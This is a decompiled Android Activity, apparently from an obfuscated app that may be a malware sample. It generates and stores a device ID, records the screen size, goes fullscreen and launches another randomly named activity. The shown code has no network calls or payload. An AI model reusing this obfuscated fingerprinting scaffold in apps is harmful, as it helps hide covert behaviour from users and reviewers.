/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Point
 *  android.os.Bundle
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.os.Bundle;
import linker.resourcer.encoder.Vwfkyqppf;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.maagohqzehyoivaxlfkohrpeu;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;

public class Vepvds
extends Activity {
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            CharSequence charSequence;
            bundle = this.getApplicationContext();
            if (vyklwirattpkwkqagsbrm.Read((Context)bundle, "ID", "").length() == 0) {
                charSequence = new StringBuilder();
                charSequence = charSequence.append(ffbrxjknfnpfxahr.Create_DevicID()).append(String.valueOf(ffbrxjknfnpfxahr.randomnumber(100, 199))).toString();
                maagohqzehyoivaxlfkohrpeu.Debug("CreateID", (String)charSequence);
                vyklwirattpkwkqagsbrm.Write((Context)bundle, "ID", (String)charSequence);
            }
            if (vyklwirattpkwkqagsbrm.Read((Context)bundle, "Wscr", "").length() == 0) {
                charSequence = new Point();
                this.getWindowManager().getDefaultDisplay().getRealSize((Point)charSequence);
                int n = Math.min(((Point)charSequence).x, ((Point)charSequence).y);
                int n2 = Math.max(((Point)charSequence).x, ((Point)charSequence).y);
                vyklwirattpkwkqagsbrm.Write((Context)bundle, "Wscr", String.valueOf(n));
                vyklwirattpkwkqagsbrm.Write((Context)bundle, "Hscr", String.valueOf(n2));
            }
            this.requestWindowFeature(1);
            this.getWindow().setFlags(1024, 1024);
            bundle = new Intent(this.getApplicationContext(), Vwfkyqppf.class);
            bundle.addFlags(0x10000000);
            this.startActivity((Intent)bundle);
        }
        catch (Exception exception) {
            this.finish();
        }
    }
}

